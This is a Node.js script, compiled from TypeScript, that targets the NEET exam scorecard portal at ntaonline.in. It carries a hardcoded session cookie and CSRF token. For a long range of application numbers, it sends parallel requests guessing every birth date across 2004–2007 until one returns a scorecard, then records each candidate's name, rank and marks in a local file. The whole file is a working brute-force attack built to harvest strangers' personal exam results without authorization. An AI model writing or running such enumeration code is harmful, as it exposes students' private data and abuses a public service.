"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
const cheerio_1 = __importDefault(require("cheerio"));
const qs_1 = __importDefault(require("qs"));
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
const filePath = path.resolve(__dirname, 'list.json');
require("./list.json");
function fetchResult(applicationNumber, day, month, year) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = qs_1.default.stringify({
            '_csrf-frontend': '0eWuzNoRUjL6S_wbEOGQTLrAbEZsdMxim70FfaI7Yb-4rtS0kSEAWJ4KqyxFvtQIg7kqNxklrSnIhXRP0lU12Q==',
            'Scorecardmodel[ApplicationNumber]': applicationNumber,
            'Scorecardmodel[Day]': day,
            'Scorecardmodel[Month]': month,
            'Scorecardmodel[Year]': year
        });
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'advanced-frontend=88a6rqa00bo5sckgmf2shk2kc7; _csrf-frontend=eb6d1314f029304ad4b0bdbfdf64f8b6411f03579bc919893b53db3709d4e5d5a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22iKzxK0RjdAW7U_DD9yFquQaKS8q2pnTf%22%3B%7D',
                'DNT': '1',
                'Origin': 'null',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"'
            },
            data: data
        };
        try {
            const response = yield axios_1.default.request(config);
            const parsedHtmlContent = parseHTML(JSON.stringify(response.data));
            if (parsedHtmlContent) {
                return parsedHtmlContent;
            }
        }
        catch (error) {
            return null;
        }
    });
}
function parseHTML(htmlContent) {
    const $ = cheerio_1.default.load(htmlContent);
    const applicationNumber = $('td:contains("Application No.")').next('td').text().trim() || 'N/A';
    // Find the candidate's name
    const candidateName = $('td:contains("Candidate’s Name")').next().text().trim() || 'N/A';
    // Find the All India Rank
    const allIndiaRank = $('td:contains("NEET All India Rank")').next('td').text().trim() || 'N/A';
    const marks = $('td:contains("Total Marks Obtained (out of 720)")').first().next('td').text().trim() || 'N/A';
    // console.log(`Application Number: ${applicationNumber}`);
    // console.log(`Candidate's Name: ${candidateName}`);
    // console.log(`All India Rank: ${allIndiaRank}`);
    // console.log(`Marks: ${marks}`);
    if (allIndiaRank === 'N/A') {
        return null;
    }
    return ({
        applicationNumber,
        candidateName,
        allIndiaRank,
        marks
    });
}
function findResults(applicationNumber) {
    return __awaiter(this, void 0, void 0, function* () {
        let solved = false;
        for (let year = 2007; year > 2003; year--) {
            if (solved) {
                break;
            }
            for (let month = 2; month < 12; month++) {
                if (solved) {
                    break;
                }
                const dataPromises = [];
                console.log("Sending request for: " + applicationNumber + " year: " + year + " month: " + month);
                for (let day = 1; day <= 31; day++) {
                    // console.log("Processing: " + applicationNumber + " " + year + "-" + month + "-" + day);
                    const data = fetchResult(applicationNumber, day.toString(), month.toString(), year.toString());
                    dataPromises.push(data);
                }
                const resolvedData = yield Promise.all(dataPromises);
                resolvedData.forEach(data => {
                    if (data) {
                        console.log(data);
                        fs.writeFile(filePath, JSON.stringify(data), 'utf8', (err) => {
                            if (err) {
                                console.error('Error writing the file:', err);
                            }
                            else {
                                console.log('File has been updated successfully');
                            }
                        });
                        solved = true;
                    }
                });
            }
        }
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let appNumber = 240411345673; appNumber < 240411999999; appNumber++) {
            yield findResults(appNumber.toString());
        }
    });
}
main();
